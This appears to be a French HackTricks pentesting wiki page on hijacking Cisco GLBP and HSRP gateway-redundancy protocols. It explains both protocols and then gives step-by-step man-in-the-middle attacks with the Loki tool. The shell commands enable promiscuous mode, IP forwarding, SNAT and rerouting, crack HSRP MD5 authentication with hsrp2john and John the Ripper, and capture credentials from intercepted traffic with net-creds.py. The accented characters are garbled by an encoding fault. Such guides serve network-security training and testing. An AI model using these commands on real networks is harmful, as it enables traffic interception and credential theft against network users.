# Attaques GLBP & HSRP

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Aper√ßu du D√©tournement FHRP

### Informations sur FHRP
FHRP est con√ßu pour fournir une robustesse r√©seau en fusionnant plusieurs routeurs en une seule unit√© virtuelle, am√©liorant ainsi la r√©partition de la charge et la tol√©rance aux pannes. Cisco Systems a introduit des protocoles importants dans cette suite, tels que GLBP et HSRP.

### Informations sur le Protocole GLBP
La cr√©ation de Cisco, GLBP, fonctionne sur la pile TCP/IP, utilisant UDP sur le port 3222 pour la communication. Les routeurs dans un groupe GLBP √©changent des paquets "hello" √† des intervalles de 3 secondes. Si un routeur ne parvient pas √† envoyer ces paquets pendant 10 secondes, il est consid√©r√© comme hors ligne. Cependant, ces minuteries ne sont pas fixes et peuvent √™tre modifi√©es.

### Op√©rations et R√©partition de la Charge GLBP
GLBP se distingue en permettant la r√©partition de la charge entre les routeurs en utilisant une seule adresse IP virtuelle coupl√©e √† plusieurs adresses MAC virtuelles. Dans un groupe GLBP, chaque routeur participe √† la transmission des paquets. Contrairement √† HSRP/VRRP, GLBP offre un v√©ritable √©quilibrage de charge gr√¢ce √† plusieurs m√©canismes :

- **√âquilibrage de Charge D√©pendant de l'H√¥te :** Maintient l'attribution d'adresse MAC AVF coh√©rente √† un h√¥te, essentiel pour des configurations NAT stables.
- **√âquilibrage de Charge Round-Robin :** L'approche par d√©faut, alternant l'attribution d'adresse MAC AVF parmi les h√¥tes demandeurs.
- **√âquilibrage de Charge Pond√©r√© Round-Robin :** R√©partit la charge en fonction de m√©triques "Poids" pr√©d√©finies.

### Composants Cl√©s et Terminologies dans GLBP
- **AVG (Passerelle Virtuelle Active) :** Le routeur principal, responsable de l'attribution des adresses MAC aux routeurs pairs.
- **AVF (Transmetteur Virtuel Actif) :** Un routeur d√©sign√© pour g√©rer le trafic r√©seau.
- **Priorit√© GLBP :** Une m√©trique qui d√©termine l'AVG, commen√ßant par d√©faut √† 100 et variant entre 1 et 255.
- **Poids GLBP :** Refl√®te la charge actuelle sur un routeur, ajustable manuellement ou via le Suivi d'Objets.
- **Adresse IP Virtuelle GLBP :** Sert de passerelle par d√©faut du r√©seau pour tous les appareils connect√©s.

Pour les interactions, GLBP utilise l'adresse multicast r√©serv√©e 224.0.0.102 et le port UDP 3222. Les routeurs transmettent des paquets "hello" √† des intervalles de 3 secondes et sont consid√©r√©s comme non op√©rationnels si un paquet est manqu√© pendant une dur√©e de 10 secondes.

### M√©canisme d'Attaque GLBP
Un attaquant peut devenir le routeur principal en envoyant un paquet GLBP avec la valeur de priorit√© la plus √©lev√©e (255). Cela peut entra√Æner des attaques de DoS ou de l'homme du milieu, permettant l'interception ou la redirection du trafic.

### Ex√©cution d'une Attaque GLBP avec Loki
[Loki](https://github.com/raizo62/loki_on_kali) peut effectuer une attaque GLBP en injectant un paquet avec une priorit√© et un poids d√©finis √† 255. Les √©tapes pr√©alables √† l'attaque consistent √† recueillir des informations telles que l'adresse IP virtuelle, la pr√©sence d'authentification et les valeurs de priorit√© du routeur en utilisant des outils comme Wireshark.

√âtapes de l'Attaque :
1. Passer en mode promiscuit√© et activer le transfert IP.
2. Identifier le routeur cible et r√©cup√©rer son IP.
3. G√©n√©rer une ARP Gratuite.
4. Injecter un paquet GLBP malveillant, en se faisant passer pour l'AVG.
5. Attribuer une adresse IP secondaire √† l'interface r√©seau de l'attaquant, refl√©tant l'adresse IP virtuelle GLBP.
6. Mettre en place SNAT pour une visibilit√© totale du trafic.
7. Ajuster le routage pour garantir un acc√®s continu √† Internet via le routeur AVG d'origine.

En suivant ces √©tapes, l'attaquant se positionne en tant que "homme du milieu", capable d'intercepter et d'analyser le trafic r√©seau, y compris les donn√©es non chiffr√©es ou sensibles.

Pour la d√©monstration, voici les extraits de commandes requis :
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### Explication passive du d√©tournement HSRP avec d√©tails de commande

#### Aper√ßu du HSRP (Protocole de redondance/de routeur en veille active)
HSRP est un protocole propri√©taire de Cisco con√ßu pour la redondance de passerelle r√©seau. Il permet la configuration de plusieurs routeurs physiques en une seule unit√© logique avec une adresse IP partag√©e. Cette unit√© logique est g√©r√©e par un routeur principal responsable de la direction du trafic. Contrairement √† GLBP, qui utilise des m√©triques comme la priorit√© et le poids pour l'√©quilibrage de charge, HSRP repose sur un seul routeur actif pour la gestion du trafic.

#### R√¥les et terminologie dans HSRP
- **Routeur actif HSRP**: Le dispositif agissant en tant que passerelle, g√©rant le flux de trafic.
- **Routeur en veille HSRP**: Un routeur de secours, pr√™t √† prendre le relais si le routeur actif √©choue.
- **Groupe HSRP**: Un ensemble de routeurs collaborant pour former un seul routeur virtuel r√©silient.
- **Adresse MAC HSRP**: Une adresse MAC virtuelle attribu√©e au routeur logique dans la configuration HSRP.
- **Adresse IP virtuelle HSRP**: L'adresse IP virtuelle du groupe HSRP, agissant en tant que passerelle par d√©faut pour les appareils connect√©s.

#### Versions de HSRP
HSRP existe en deux versions, HSRPv1 et HSRPv2, diff√©rant principalement en capacit√© de groupe, utilisation d'IP multicast et structure d'adresse MAC virtuelle. Le protocole utilise des adresses IP multicast sp√©cifiques pour l'√©change d'informations de service, avec des paquets Hello envoy√©s toutes les 3 secondes. Un routeur est consid√©r√© comme inactif s'il ne re√ßoit aucun paquet dans un intervalle de 10 secondes.

#### M√©canisme d'attaque HSRP
Les attaques HSRP impliquent de prendre de force le r√¥le du Routeur actif en injectant une valeur de priorit√© maximale. Cela peut entra√Æner une attaque de l'Homme du Milieu (MITM). Les √©tapes essentielles pr√©alables √† l'attaque incluent la collecte de donn√©es sur la configuration HSRP, qui peut √™tre effectu√©e en utilisant Wireshark pour l'analyse du trafic.

#### √âtapes pour contourner l'authentification HSRP
1. Enregistrer le trafic r√©seau contenant des donn√©es HSRP dans un fichier .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extraire les hachages MD5 du fichier .pcap en utilisant hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Casser les hachages MD5 en utilisant John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Ex√©cution de l'injection HSRP avec Loki**

1. Lancer Loki pour identifier les annonces HSRP.
2. D√©finir l'interface r√©seau en mode promiscuit√© et activer le transfert IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Utiliser Loki pour cibler le routeur sp√©cifique, entrer le mot de passe HSRP cass√© et effectuer les configurations n√©cessaires pour se faire passer pour le Routeur actif.
4. Apr√®s avoir obtenu le r√¥le de Routeur actif, configurer votre interface r√©seau et les tables IP pour intercepter le trafic l√©gitime.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modifier la table de routage pour router le trafic √† travers l'ancien Routeur actif.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Utiliser net-creds.py ou un utilitaire similaire pour capturer les informations d'identification √† partir du trafic intercept√©.
```shell
sudo python2 net-creds.py -i eth0
```

L'ex√©cution de ces √©tapes place l'attaquant dans une position pour intercepter et manipuler le trafic, similaire √† la proc√©dure de d√©tournement GLBP. Cela met en √©vidence la vuln√©rabilit√© des protocoles de redondance comme HSRP et la n√©cessit√© de mesures de s√©curit√© robustes.


## R√©f√©rences
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez** üí¨ le [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
